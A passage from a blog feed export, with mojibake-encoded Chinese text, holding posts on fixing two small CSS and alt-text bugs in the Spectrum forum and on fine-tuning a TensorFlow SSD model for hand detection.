æ²’æƒ³åˆ°ä¸Šé¢çš„æ¸¬è³‡è½‰æ›å‡ºä¾†æ˜¯ï¼š&quot;text&quot;:&quot;oneline\nnewline\nthirdline&quot;ï¼Œçœ‹ä¾† Server çš„è½‰æ›å®Œå…¨æ­£å¸¸ï¼Œæ›è¡Œè¢«è½‰ç‚º\nï¼Œå…©å€‹æ›è¡Œè¢«è½‰ç‚ºä¸€å€‹æ–°çš„ blockï¼Œçœ‹ä¾†å•é¡Œæ˜¯å‡ºåœ¨å‰ç«¯æ²’æœ‰æŠŠé€™å€‹æ›è¡Œå¥½å¥½è¼¸å‡ºã€‚
æ¥è‘—å†ç”¨å·®ä¸å¤šçš„æ–¹æ³•ä¸€æ¨£ç”¨ React Devtool ä¾†çœ‹ï¼Œç™¼ç¾å‰ç«¯é¡¯ç¤ºæ˜¯ threadDetail.js åœ¨è™•ç†ï¼Œè€Œè£¡é¢å‘¼å«äº† threadRenderer.jsï¼Œçœ‹ä¾†é€™å°±æ˜¯çœŸçš„ render çš„åœ°æ–¹äº†ã€‚
æ‰¾åˆ° threadRenderer.js ä¹‹å¾Œï¼Œç™¼ç¾è£¡é¢åªæ˜¯å–®ç´”åœ°å‘¼å«äº† redraft é€™å€‹ libraryã€‚
å¥½ï¼Œé›–ç„¶åˆæœ‰æ–°çš„æ±è¥¿è¦ç ”ç©¶ï¼Œä½†é›¢ç­”æ¡ˆæ„ˆä¾†æ„ˆè¿‘äº†ã€‚
ä»”ç´°çœ‹äº†ä¸€ä¸‹ redraft çš„æ–‡ä»¶ï¼Œçœ‹èµ·ä¾†æ˜¯å¯ä»¥è‡ªå®šç¾©æ¯ä¸€å€‹å‹æ…‹æœ€å¾Œçš„è¼¸å‡ºè¦é•·ä»€éº¼æ¨£å­ã€‚å¾€ä¸‹æŠŠå®˜æ–¹æ–‡ä»¶çœ‹å®Œï¼Œç™¼ç¾æœ‰ä¸€å€æ˜¯ Common issues
ï¼Œè£¡é¢å¯«è‘—ï¼š

Can the multiple spaces between text be persisted?
Add white-space: pre-wrap to a parent div, this way it will preserve spaces and wrap to new lines (as editor js does)

çœ‹åˆ°é€™é‚Šï¼Œç­”æ¡ˆå·²ç¶“å¾ˆæ˜é¡¯äº†ï¼Œå°±æ˜¯å‰ç«¯é¡¯ç¤ºå¿˜è¨˜åŠ  white-space: pre-wrapï¼Œæ‰€ä»¥é è¨­çš„è¡Œç‚ºæœƒæŠŠæ›è¡Œç•¶ä½œæ˜¯ç©ºæ ¼ã€‚
çœŸç›¸å¤§ç™½çš„æ™‚å€™æˆ‘åœ¨å¿ƒè£¡æš—ç½µäº†ä¸€è²é«’è©±ï¼Œä½†æ˜¯æ˜¯ç½µè‡ªå·±ã€‚å› ç‚ºé€™å•é¡Œåœ¨å‰ç«¯å…¶å¯¦æ»¿å¸¸è¦‹çš„ï¼Œæˆ‘ä¹Ÿç”¨éé€™å±¬æ€§å¾ˆå¤šæ¬¡ã€‚å¯æ˜¯åœ¨æˆ‘çœ‹åˆ°é€™å•é¡Œçš„æ™‚å€™æˆ‘ç¬¬ä¸€é»å±…ç„¶æ˜¯å¾€å¾Œç«¯å»æ‡·ç–‘ï¼Œå®Œå…¨æ²’æƒ³åˆ°æœ‰å¯èƒ½æ˜¯å‰ç«¯çš„å•é¡Œï¼Œæ›´æ²’æœ‰æƒ³åˆ°åŸä¾†æ˜¯åŠ ä¸€è¡Œ CSS å°±å¯ä»¥æå®šçš„äº‹ã€‚
æ¥è‘—å°±å…ˆç™¼äº†ä¸€å€‹ Issue è¨˜éŒ„äº†ä¸€ä¸‹èª¿æŸ¥çš„éç¨‹è·Ÿæˆå› ï¼Œç„¶å¾Œç™¼äº†å€‹ PRï¼Œé›–ç„¶åªæ˜¯æ”¹é€™éº¼ä¸€è¡Œè€Œå·²ï¼Œä½†æ˜¯å°æˆ‘æ„ç¾©é‡å¤§ã€‚å› ç‚ºåªè¦é€™å€‹ bug ä¿®å¥½ï¼Œé€™å¥—å°±ç«‹åˆ»æµ·æ”¾å…¶ä»–ç¾æˆçš„è«–å£‡ç³»çµ±ã€‚
ä»–å€‘çš„é€Ÿåº¦å¾ˆå¿«ï¼Œç™¼ PR ä¹‹å¾Œéš”å¤©å°±è¢« merge äº†ï¼Œå†éš”å€‹ä¸€é€±å°±è¢« deploy åˆ° production äº†ï¼ŒçœŸçš„å¾ˆæœ‰æ•ˆç‡ã€‚
æ„çŒ¶æœªç›¡ï¼Œå†ä¿®ä¸€å€‹ï¼é›–ç„¶åªæœ‰ä¸€è¡Œï¼Œä½†æ¢ç´¢çš„éç¨‹ç²ç›Šè‰¯å¤šï¼Œè€Œä¸” PR èƒ½è¢« merge å°±å¾ˆé–‹å¿ƒã€‚æ—¢ç„¶éƒ½ä¿®äº†ä¸€å€‹ï¼Œé‚£ä¾†æ‰¾æ‰¾çœ‹æœ‰æ²’æœ‰å…¶ä»–å®¹æ˜“ä¿®çš„å¥½äº†ï¼Œå¯ä»¥ä¸€èµ·é †æ‰‹ä¿®æ‰ã€‚
åœ¨å®˜æ–¹çš„ Issues ç¿»ä¸€ç¿»ï¼Œæ‰¾åˆ°ä¸€å€‹çœ‹èµ·ä¾†ä¸é›£çš„ï¼šWeird image failed rendering in thread bodyï¼Œé€™å€‹ Issue å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä¸çŸ¥é“ç‚ºä»€éº¼æœƒå‡ºç¾ä¸‹é¢çš„ bugï¼š

æ–‡å­—è¦†è“‹ä½äº†å¾Œé¢çš„åœ–ç‰‡ã€‚
Issue è£¡é¢æœ‰é™„ä¸ŠåŸæ–‡ç¶²å€ï¼Œé»é€²å»ä»¥å¾Œç”¨ devtool çœ‹äº†ä¸€ä¸‹ï¼Œç™¼ç¾å•é¡Œå‡ºåœ¨ç•¶ç€è¦½å™¨ç„¡æ³•è¼‰å…¥ img æ¨™ç±¤çš„åœ–ç‰‡æ™‚ï¼Œå°±æœƒè®Šæˆé€™æ¨£ã€‚
æˆ‘ä¹‹å‰å®Œå…¨æ²’ç¢°éé€™å•é¡Œï¼Œä½†è‡ªå·±è©¦äº†ä¸€ä¸‹ï¼Œç™¼ç¾ img åŸæœ¬æœ‰ marginï¼Œå¯æ˜¯åœ¨åœ–ç‰‡æ²’è¾¦æ³•è¼‰å…¥çš„æ™‚å€™æœƒå¤±æ•ˆã€‚ç›´è¦ºå‘Šè¨´æˆ‘é€™å¯èƒ½æ˜¯ margin collapsing æœ‰é—œçš„å•é¡Œã€‚
å¾Œä¾†æˆ‘è‡ªå·±è©¦äº†ä¸€ä¸‹ï¼Œå•é¡Œå‡ºåœ¨ç•¶åœ–ç‰‡ç„¡æ³•è¼‰å…¥ï¼Œimg çš„é«˜åº¦å°±æœƒè®Šæˆ 0ï¼Œç„¶å¾Œ margin å°±æœƒå¤±æ•ˆã€‚å› ç‚ºä¸€äº›æ’ç‰ˆè·Ÿ CSS çš„å…ƒç´ ï¼Œä¸‹é¢çš„æ–‡å­—å°±æœƒè“‹ä¸Šä¾†ï¼Œè®Šæˆä¸‹é¢çš„åœ–ç‰‡é‚£æ¨£ã€‚

é‚£æœ‰ä»€éº¼å¥½è§£æ³•å—ï¼Ÿ
æˆ‘ç™¼ç¾ä¸€å€‹æœ€ç°¡å–®çš„è§£æ³•å°±æ˜¯åŠ ä¸Š alt å±¬æ€§ï¼Œç•¶åœ–ç‰‡ç„¡æ³•è¼‰å…¥æ™‚å°±æœƒå°±æœƒé¡¯ç¤ºé€™å€‹æ–‡å­—ï¼Œimg å°±èƒ½ä¿æœ‰é«˜åº¦ï¼Œmargin ä¹Ÿèƒ½ä½œç”¨ã€‚

æŸ¥åˆ°è§£æ³•ä¹‹å¾Œä¸€æ¨£å…ˆå›åœ¨ Issue ä¸‹é¢è·Ÿä»–å€‘è¨è«–ï¼Œçœ‹ä»–å€‘è¦ºå¾—å¦‚ä½•ã€‚
å¾Œä¾†æˆ‘ç™¼ç¾åŸæœ¬ä¸Šå‚³åœ–ç‰‡æ™‚å…¶å¯¦å°±æœ‰è¨­å®š altï¼Œä½†å¯èƒ½åœ¨ä¸€äº›é‚Šç•Œæ¢ä»¶ä¸‹æœƒæ˜¯ç©ºçš„ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨è€…æ‰‹å‹•æŠŠ alt ç§»é™¤æ‰ã€‚
æ‰€ä»¥æœ€å¾Œçš„è§£æ³•ä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯å¹« alt åŠ ä¸€å€‹é è¨­å€¼ï¼ŒPR: Add default alt text to imgï¼š
-  &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt&#125; /&gt;,+  &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt || &#x27;Image&#x27;&#125; /&gt;

ç¸½çµé›–ç„¶åªæœ‰è²¢ç»äº†å…©è¡Œï¼Œä½†èƒ½çœ‹åˆ°è‡ªå·±çš„å¸³è™Ÿå‡ºç¾åœ¨ release log ä¸Šé¢é‚„æ˜¯æ»¿é–‹å¿ƒçš„ï¼š

å¦‚æœæ˜¯ä»¥å‰çš„è‡ªå·±ï¼Œæˆ‘çµ•å°ä¸æœƒå¹¹é€™ç¨®äº‹ã€‚çµ•å°æ˜¯ç™¼ç¾ bug ä¹‹å¾Œå°±åœä½äº†ï¼Œç„¶å¾Œç­‰è‘—å®˜æ–¹åœ˜éšŠä¾†ä¿® bugã€‚
ä½†é€™å¹¾å¹´æ¼¸æ¼¸é–‹å§‹ç†Ÿæ‚‰èµ·çœ‹å…¶ä»–äººçš„ codeï¼Œå·¥ä½œçš„æ™‚å€™å¶çˆ¾æ²’äº‹å°±å¯ä»¥çœ‹ä¸€ä¸‹ redux-form æˆ–æ˜¯ redux çš„ source code ç­‰ç­‰ï¼Œçœ‹è‘—çœ‹è‘—è¦ºå¾—ä¹Ÿæ²’é‚£éº¼å¯æ€•ã€‚è€Œä¸” GitHub é‚„æœ‰å€‹è¶…å¥½ç”¨åŠŸèƒ½å«åšã€Œæœå°‹ã€ï¼Œå¾ˆå¤šæ™‚å€™ç›´æ¥æœé—œéµå­—å°±èƒ½æ‰¾åˆ°ç›¸é—œçš„åŸå§‹ç¢¼ï¼Œç¯€çœè¶…ç´šå¤šæ™‚é–“ã€‚
åœ¨çœ‹å…¶ä»–äººçš„å°ˆæ¡ˆæ™‚ï¼Œæˆ‘è¦ºå¾—æœ€é›£çš„æ˜¯å®šä½å•é¡Œï¼Œä¸€ä½†ä½ å®šä½å•é¡Œä¹‹å¾Œå…¶ä»–éƒ½æ²’é‚£éº¼é›£äº†ï¼Œå› ç‚ºä½ å·²ç¶“çŸ¥é“æ˜¯å“ªå€‹æª”æ¡ˆã€å“ªæ®µç¨‹å¼ç¢¼æœ‰å•é¡Œï¼Œæ¥è‘—åªè¦æœé‚£é‚Šå»ç ”ç©¶å°±å¥½ã€‚è‡³æ–¼è©²æ€éº¼å®šä½å•é¡Œï¼Œæœ‰ä»¥ä¸‹å¹¾å€‹å»ºè­°ï¼š

ç›´æ¥æœå°‹ç¨‹å¼ç¢¼ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ç›¸é—œæ®µè½
åˆ©ç”¨ devtool æ‰¾å‡ºç›¸é—œçš„å…ƒä»¶
çœ‹æ–‡ä»¶ï¼Œçœ‹ä¸Šé¢æœ‰æ²’æœ‰é™„ä¸€äº›æ¶æ§‹

ç•¶ä½ è¦ä¿® bug çš„æ™‚å€™ï¼Œæ–¹å‘æ˜¯å¾ˆæ˜ç¢ºçš„ï¼Œæ²’æœ‰å¿…è¦æ•´å€‹å°ˆæ¡ˆéƒ½çœ‹éï¼Œåªè¦æ‰¾åˆ°ä½ è¦ä¿®çš„åœ°æ–¹å°±å¥½ã€‚é€™ä¸€ç¯‡å¸Œæœ›èƒ½åˆ†äº«æˆ‘çš„ç¶“é©—çµ¦å¤§å®¶ã€‚
æœ€å¾Œï¼Œç•¶å€‹å·¥ç¨‹å¸«çœŸå¥½ï¼Œæœ‰é–‹æºå°ˆæ¡ˆçœŸå¥½ï¼Œæœ‰ bug éƒ½å¯ä»¥è‡ªå·±ä¿®æ‰ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>github</tag>
        <tag>open source</tag>
        <tag>spectrum</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç”¨ TensorFlow object detection API çš„ Single Shot MultiBox Detector ä¾†åš hand detection</title>
    <url>/2019/02/16/ssd-hand-detection-with-tensorflow-object-detection-api/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©è¦ä¾†æ•™å¤§å®¶æ€éº¼ç”¨ TensorFlow çš„ Object Detection API ä¾†åµæ¸¬äººçš„æ‰‹ï¼Œå› ç‚ºç­†è€…æœ€è¿‘åœ¨ä½¿ç”¨ é€™å€‹ repo çš„ codeæ™‚ï¼Œé‚„æ˜¯é‡åˆ°äº†ä¸€äº›å•é¡Œï¼Œéœ€è¦è‡ªå·±å†å»æ‰¾è³‡æ–™è§£æ±ºï¼Œæ‰€ä»¥æ±ºå®šåŸºæ–¼å‰äººçš„åŸºç¤ä¹‹ä¸Šå†è£œå……èªªæ˜ä¸€äº›
ç›¸æ¯”èµ·å»å¹´å¯«éçš„ ä¸€èµ·ä¾†ç© OSRF çš„ TensorFlow Object Detectorï¼Œé€™ä¸€ç¯‡æœƒæœ‰æ›´å¤šå°æ–¼æ¼”ç®—æ³•å’Œç´°ç¯€çš„æ•˜è¿°ï¼Œè®“å¤§å®¶ä¹‹å¾Œä¹Ÿå¯ä»¥è‡ªå·±å­¸ç¿’æ·±å…¥ç ”ç©¶å„å€‹ modelã€‚
TensorFlow Object Detection API çš„ä½¿ç”¨æµç¨‹åœ¨ä¸€é–‹å§‹ï¼Œå…ˆçŸ¥é“æ‰€æœ‰è¦åšçš„æ­¥é©Ÿï¼Œæœƒå°æ–¼æ•´å€‹æµç¨‹æ¯”è¼ƒæœ‰æ¦‚å¿µï¼š

å‡è¨­ï¼Œä½ ä»Šå¤©æ˜¯åªæƒ³æ‹¿åˆ¥äººç¾æˆçš„çµæœä¾†åš hand detectionï¼Œé‚£ä½ å¯ä»¥ä¸éœ€è¦æœƒä¸Šé¢é€™ä¸€ä¸²æ­¥é©Ÿï¼Œä½ åªéœ€è¦æœƒæœ€å¾Œä¸€æ­¥ - Inferenceï¼Œæ‹¿åˆ°ç¾æˆçš„ frozen_inference_graph.pbï¼Œå†å¯«å€‹ç¨‹å¼ç›´æ¥ä½¿ç”¨é€™å€‹frozen_inference_graph.pbä¾† inference å°±å¥½ ï¼ˆè«‹åƒè€ƒ é€™å€‹ç¯„ä¾‹ï¼‰ã€‚
ä½†å¦‚æœä½ å°çµæœä¸æ»¿æ„ï¼Œæƒ³è¦å† finetune ç¾æœ‰çš„ modelï¼›æˆ–æ˜¯ä½ ä¸æƒ³è¦åªåµæ¸¬æ‰‹ï¼Œä½ å¯èƒ½é‚„æƒ³åˆ†è¾¨æ˜¯å·¦æ‰‹é‚„æ˜¯å³æ‰‹ï¼ˆä¹Ÿå°±æ˜¯ model çš„è¼¸å‡ºé¡åˆ¥è¦è®Šï¼‰ï¼Œé‚£ä½ å°±æœƒéœ€è¦å­¸æœƒæ•´å€‹æµç¨‹äº†ï¼Œè€Œé€™ç¯‡æ•™å­¸å°±å¸Œæœ›å¯ä»¥é”åˆ°é€™å€‹ç›®çš„ã€‚

æˆ‘å‡è¨­å¤§å®¶éƒ½å·²ç¶“æœ‰ Pythonã€TensorFlow é€™äº›æ±è¥¿äº†ï¼Œæ²’æœ‰çš„è©±å¯ä»¥å…ˆå»å®‰è£ä¸€ä¸‹ã€‚

Dataset download &amp; Image annotationDataset çš„æº–å‚™å¸¸å¸¸æ˜¯åœ¨åš Deep Learning ç ”ç©¶æœ€éº»ç…©çš„ä¸€å¡Šï¼Œå¦‚æœè¦è‡ªå·±å»æº–å‚™ï¼Œæ˜¯å¯ä»¥æ‹¿ä¸€å°ç›¸æ©Ÿå°±å‡ºå»é–‹å§‹æ‹ï¼Œæˆ–ä¸Šç¶²çˆ¬ä¸‹ä¸€å †åœ–ç‰‡ï¼Œç„¶å¾Œå†ä¸€å¼µå¼µæ…¢æ…¢æ¨™è¨»ã€‚ï¼ˆå¯ä»¥ç”¨ labelImg æˆ– labelmeï¼‰
Hand dataset æ˜¯æœ‰ä¸€äº›é¸æ“‡ï¼Œæ¯”è¼ƒæœ‰åçš„åŒ…å« University of Oxford çš„ Hand Dataset å’Œ Indiana Univeristy çš„ EgoHandsã€‚
å› ç‚ºé€™äº› dataset éƒ½ç®—è¶³å¤ é‡çš„åœ–ç‰‡åŠ ä¸Š ground truth dataï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥æ‹¿é€™äº› dataset ä¾†ç”¨ï¼Œæˆ‘å€‘å…ˆå‡è¨­æˆ‘å€‘æ˜¯ç”¨ EgoHandsã€‚
ä½†å› ç‚º TemsorFlow Object Detection API éœ€è¦åƒçš„æ˜¯ TF record æ ¼å¼çš„æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘å€‘é‚„éœ€è¦åšçš„æº–å‚™æ˜¯ï¼š

æŠŠ dataset è£¡é¢çš„çš„æ ¼å¼è½‰æˆ csv
æŠŠ csv çš„å…§å®¹è½‰æˆ TF record

ä¹‹æ‰€ä»¥è¦å…ˆè½‰æˆ csv æ˜¯å› ç‚º csv æ˜¯ç›¸å°æ–¹ä¾¿æˆ‘å€‘çœ‹ ground truth data æœ‰æ²’æœ‰å•é¡Œçš„ã€‚
é—œæ–¼æŠŠ EgoHands çš„ labels è½‰æˆè‡ªå·±çš„ csv æª”ï¼Œä½ å¯ä»¥åƒè€ƒ egohands_dataset_clean.pyï¼Œå…¶ä¸­æœ€é—œéµçš„åœ°æ–¹å°±æ˜¯é€™å€‹ functionï¼ŒæŠŠ EgoHands è£¡é¢åŸæœ¬å­˜çš„ label è®€å‡ºä¾†ä¸¦å¯«åˆ° csv ç•¶ä¸­ã€‚
def get_bbox_visualize(base_path, dir):image_path_array = []for root, dirs, filenames in os.walk(base_path + dir):for f in filenames:if(f.split(&quot;.&quot;)[1] == &quot;jpg&quot;):img_path = base_path + dir + &quot;/&quot; + fimage_path_array.append(img_path)#sort image_path_array to ensure its in the low to high order expected in polygon.matimage_path_array.sort()boxes = sio.loadmat(base_path + dir + &quot;/polygons.mat&quot;)# there are 100 of these per folder in the egohands datasetpolygons = boxes[&quot;polygons&quot;][0]# first = polygons[0]# print(len(first))pointindex = 0for first in polygons:index = 0font = cv2.FONT_HERSHEY_SIMPLEXimg_id = image_path_array[pointindex]img = cv2.imread(img_id)img_params = &#123;&#125;img_params[&quot;width&quot;] = np.size(img, 1)img_params[&quot;height&quot;] = np.size(img, 0)head, tail = os.path.split(img_id)img_params[&quot;filename&quot;] = tailimg_params[&quot;path&quot;] = os.path.abspath(img_id)img_params[&quot;type&quot;] = &quot;train&quot;pointindex += 1boxarray = []csvholder = []for pointlist in first:pst = np.empty((0, 2), int)max_x = max_y = min_x = min_y = height = width = 0findex = 0for point in pointlist:if(len(point) == 2):x = int(point[0])y = int(point[1])if(findex == 0):min_x = xmin_y = yfindex += 1max_x = x if (x &gt; max_x) else max_xmin_x = x if (x &lt; min_x) else min_xmax_y = y if (y &gt; max_y) else max_ymin_y = y if (y &lt; min_y) else min_y# print(index, &quot;====&quot;, len(point))appeno = np.array([[x, y]])pst = np.append(pst, appeno, axis=0)cv2.putText(img, &quot;.&quot;, (x, y), font, 0.7,(255, 255, 255), 2, cv2.LINE_AA)hold = &#123;&#125;hold[&#x27;minx&#x27;] = min_xhold[&#x27;miny&#x27;] = min_yhold[&#x27;maxx&#x27;] = max_xhold[&#x27;maxy&#x27;] = max_yif (min_x &gt; 0 and min_y &gt; 0 and max_x &gt; 0 and max_y &gt; 0):boxarray.append(hold)labelrow = [tail,np.size(img, 1), np.size(img, 0), &quot;hand&quot;, min_x, min_y, max_x, max_y]csvholder.append(labelrow)cv2.polylines(img, [pst], True, (0, 255, 255), 1)cv2.rectangle(img, (min_x, max_y),(max_x, min_y), (0, 255, 0), 1)csv_path = img_id.split(&quot;.&quot;)[0]if not os.path.exists(csv_path + &quot;.csv&quot;):cv2.putText(img, &quot;DIR : &quot; + dir + &quot; - &quot; + tail, (20, 50),cv2.FONT_HERSHEY_SIMPLEX, 0.75, (77, 255, 9), 2)cv2.imshow(&#x27;Verifying annotation &#x27;, img)save_csv(csv_path + &quot;.csv&quot;, csvholder)print(&quot;===== saving csv file for &quot;, tail)cv2.waitKey(2) # close window when a key press is detected

æˆåŠŸåŸ·è¡Œå®Œï¼Œä½ å°±å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ csv æª”ï¼ˆclass æˆ‘æœ‰è‡ªå·±æ”¹éï¼Œå¦‚æœæ˜¯è·‘ç¯„ä¾‹çš„ç¨‹å¼ç¢¼ï¼Œéƒ½æœƒæ˜¯ handï¼‰ï¼š

è‹¥ä½ æƒ³è¦ä¿®æ”¹è‡ªå·±çš„ classï¼Œé‚£å°±éœ€è¦å»æ”¹ä¸Šé¢é‚£æ®µç¨‹å¼ç¢¼çš„é€™ä¸€è¡Œï¼š
labelrow = [tail,np.size(img, 1), np.size(img, 0), &quot;hand&quot;, min_x, min_y, max_x, max_y]

æŠŠ â€œhandâ€ ç”¨å…¶ä»–æ–¹å¼å–ä»£ã€‚
Label map preparation &amp; TF Record generationç•¶ä½ æœ‰äº† csv æª”ä¹‹å¾Œï¼Œæ¥ä¸‹ä¾†ä½ é‚„æœƒéœ€è¦è½‰æˆ TF record æª”ï¼Œæ‰€ä»¥ä½ æœƒéœ€è¦ç”¨ generate_tfrecord.py ä¾†ç”¢ç”Ÿä½ çš„ TF record æª”ã€‚
å…¶ä¸­æœ‰ä¸€å€‹é—œéµçš„åœ°æ–¹æ˜¯ï¼ŒTF Record åƒçš„é¡åˆ¥æ˜¯æ•¸å­—ï¼Œæ‰€ä»¥ä½ éœ€è¦è‡ªå·±å»æ³¨æ„æ•¸å­—è·Ÿé¡åˆ¥é–“çš„å°æ‡‰é—œä¿‚ï¼Œè€Œé€™å€‹å°æ‡‰é—œä¿‚æ˜¯ç”± hand_label_map.pbtxt ä¾†æè¿°ï¼š
item &#123;id: 1name: &#x27;hand&#x27;&#125;

æ‰€ä»¥ä½ åœ¨ç”¨ ç”¢ç”Ÿ TF record æª”æ™‚ï¼Œè¦å¾ˆæ³¨æ„é€™ä¸€æ®µ codeï¼š
# TO-DO replace this with label mapdef class_text_to_int(row_label):if row_label == &#x27;nine&#x27;:return 1elif row_label == &#x27;ten&#x27;:return 2elif row_label == &#x27;jack&#x27;:return 3elif row_label == &#x27;queen&#x27;:return 4elif row_label == &#x27;king&#x27;:return 5elif row_label == &#x27;ace&#x27;:return 6else:return None

åœ¨æˆ‘å€‘çš„æ‡‰ç”¨ä¸­ï¼Œä½ æœƒæ”¹æˆï¼š
# TO-DO replace this with label mapdef class_text_to_int(row_label):if row_label == &#x27;hand&#x27;:return 1else:return None

Pipeline configurationå‰é¢çš„æ­¥é©Ÿæ˜¯ç‚ºäº†ç”¢ç”Ÿ TF record å’Œ label mapï¼Œæœ€å¾Œåªè¦æŠŠä½ çš„ config æª”è¨­å®šå¥½å°±å¥½ï¼Œå› ç‚ºæˆ‘å€‘æ²’æœ‰è¦é‡æ–°è¨“ç·´ä¸€å€‹æ¨¡å‹ï¼Œè€Œæ˜¯æ‹¿äººå®¶å·²ç¶“ç”¨ Coco dataset pretrain å¥½çš„ SSD ä¾† finetuneï¼Œæ‰€ä»¥å¯ä»¥åƒè€ƒé€™å€‹è³‡æ–™å¤¾ è£¡é¢çš„ ssd_mobilenet_v1_coco.configã€‚
è£¡é¢æ¯”è¼ƒå¸¸æ”¹çš„åœ°æ–¹æ˜¯

Training step æ•¸ï¼ˆä¸€èˆ¬æˆ‘å€‘éƒ½æ˜¯è¨“ç·´åˆ°å†å¢åŠ çµæœä¹Ÿä¸æœƒè®Šå¥½ï¼‰
num_steps: 200000

æŒ‡å®š training data çš„ TF record æª”è·Ÿ label mapï¼š


train_input_reader: &#123;tf_record_input_reader &#123;input_path: &quot;PATH_TO_DATA/train.record&quot;&#125;label_map_path: &quot;PATH_TO_DATA/hand_label_map.pbtxt&quot;&#125;


æŒ‡å®š training data çš„ TF record æª”è·Ÿ label mapï¼š

eval_input_reader: &#123;tf_record_input_reader &#123;input_path: &quot;PATH_TO_DATA/test.record&quot;&#125;label_map_path: &quot;hand_inference_graph/hand_label_map.pbtxt&quot;shuffle: falsenum_readers: 1num_epochs: 1&#125;

ä»¥ä¸Šå°±æ˜¯è¦è‡ªå·±åš training çš„æ‰€æœ‰äº‹å‰æº–å‚™å·¥ä½œã€‚å› ç‚ºæœ‰å¾ˆå¤šæ±è¥¿æ˜¯åˆ¥äººå¯«éçš„ï¼Œæˆ‘ä¸¦æ²’æœ‰é‡è¤‡å¯«å¾—å¾ˆè©³ç´°ï¼Œå¦‚æœï¼š

ä½ ç”¨ Windowsï¼Œè«‹çœ‹ How To Train an Object Detection Classifier for Multiple Objects Using TensorFlow (GPU) on Windows 10
ä½ ç”¨ Linuxï¼Œè«‹çœ‹ Hand Detection Tutorial

Trainingå¦‚æœä¸Šé¢çš„æ­¥é©Ÿéƒ½å·²ç¶“åšå®Œï¼Œ training å°±åªæ˜¯è·‘å¹¾è¡ŒæŒ‡ä»¤è€Œå·²ï¼š
cd C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research\object_detectionset PYTHONPATH=C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models;C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research;C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research\slimpython train.py --logtostderr --train_dir=training/ --pipeline_config_path=training/ssd_mobilenet_v1_coco.config

å¦‚æœ train å®Œæƒ³è¦çœ‹ä¸€ä¸‹çµæœï¼Œå¯ä»¥ç”¨ tensorboard çœ‹ä¸€ä¸‹ï¼š
tensorboard --logdir=training

å¦‚æœçµæœæ»¿æ„ï¼Œå°±å¯ä»¥è¼¸å‡º frozen graphï¼š
python export_inference_graph.py â€“input_type image_tensor â€“pipeline_config_path training&#x2F;ssd_mobilenet_v1_coco.config â€“trained_checkpoint_prefix training&#x2F;model.ckpt â€“output_directory inference_graph
æ€éº¼è©•ä¼°è‡ªå·± finetune å®Œçš„ model æ˜¯å¦å¤ å¥½ï¼Ÿåœ¨ä¸Šé¢è¨“ç·´çš„éç¨‹ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¯å€‹ step çš„ loss æœ‰å¤šå°‘ï¼Œä¸€èˆ¬ä¾†èªªæˆ‘å€‘æœƒå¸Œæœ›è¨“ç·´åˆ° 2 ä»¥ä¸‹ï¼Œç®—æ˜¯å¯ä»¥æœ‰é‚„ OK çš„è¾¨è­˜æ•ˆæœã€‚
å¦‚æœä½ æƒ³åšæ›´åš´è¬¹çš„ evaluationï¼Œæˆ‘è·Ÿå¤§å®¶æ¨è–¦ Object-Detection-Metricsï¼Œåªè¦å°‡ test data çš„ ground truth è·Ÿä½ çš„è¾¨è­˜çµæœéƒ½è¼¸å‡ºåˆ° txt æª”ï¼Œå°±å¯ä»¥è·‘è£¡é¢æä¾›çš„ç¨‹å¼ä¾†ç•«å‡º Precision-Recall Curveï¼Œå¾—åˆ° AP å’Œ mAPï¼Œé —ç‚ºæ–¹ä¾¿ã€‚
ç¸½çµä»Šå¤©è·Ÿå¤§å®¶åˆ†äº«äº†è¦æ€éº¼ç”¨ TensorFLow object detection API ä¾†è¨“ç·´å’Œè¾¨è­˜æ‰‹ï¼Œå¸Œæœ›é€éå­¸ç¿’æµç¨‹ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥å°‡é€™å€‹æŠ€è¡“æ‡‰ç”¨åˆ°è‡ªå·±æœ‰èˆˆè¶£çš„é ˜åŸŸï¼
å»¶ä¼¸é–±è®€
How to Build a Real-time Hand-Detector using Neural Networks (SSD) on Tensorflow
Hand Detection Tutorial
SSD: Single Shot MultiBox Detector

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>TensorFlow, Deep Learning, Computer Vision, Hand detection</tag>
      </tags>
  </entry>
  <entry>
    <title>ååˆ†é˜ã€äº”æ­¥é©Ÿï¼ŒSVG å‹•èµ·ä¾†ï¼</title>
    <url>/2019/11/06/svg-animation-in-10mins/</url>
